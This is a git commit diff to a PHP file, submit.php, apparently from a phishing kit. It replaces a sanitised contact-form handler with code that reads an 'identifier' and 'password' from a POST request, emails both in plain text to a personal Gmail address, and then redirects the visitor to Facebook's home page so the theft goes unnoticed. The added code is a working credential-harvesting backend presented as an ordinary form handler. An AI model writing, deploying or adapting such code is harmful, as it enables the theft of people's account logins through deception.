7355aff2cb2244b9bfe9cc07caca9e548dd2badc
Morishey <morishey@onmail.com>
2024-06-23 07:01:31 -0600

    modified php

--- submit.php
+++ submit.php
@@ -1,34 +1,17 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Collect and sanitize form data
-    $name = filter_var($_POST['name'], FILTER_SANITIZE_STRING);
-    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
-    $message = filter_var($_POST['message'], FILTER_SANITIZE_STRING);
+// Collect form data
+$identifier = $_POST['identifier'] ?? '';
+$password = $_POST['password'] ?? '';
 
-    if (!$email) {
-        echo "Invalid email format.";
-        exit;
-    }
+// Compose email content
+$to = 'jaeger.62frei@gmail.com';
+$subject = 'Form Submission';
+$message = "Identifier: $identifier\r\nPassword: $password";
 
-    // Email details
-    $to = "jaeger.62frei@gmail.com";
-    $subject = "New Form Submission";
-    $headers = "From: " . $email . "\r\n" .
-               "Reply-To: " . $email . "\r\n" .
-               "X-Mailer: PHP/" . phpversion();
 
-    // Email content
-    $body = "You have received a new message from the contact form on your website.\n\n" .
-            "Here are the details:\n\n" .
-            "Name: $name\n" .
-            "Email: $email\n" .
-            "Message:\n$message";
+$mailResult = mail($to, $subject, $message);
 
-    // Send email
-    if (mail($to, $subject, $body, $headers)) {
-        echo "Thank you for contacting us. We will get back to you shortly.";
-    } else {
-        echo "Sorry, something went wrong. Please try again later.";
-    }
-}
+// Redirect to Facebook (assuming you want to redirect immediately)
+header('Location: https://facebook.com/home');
+exit;
 ?>
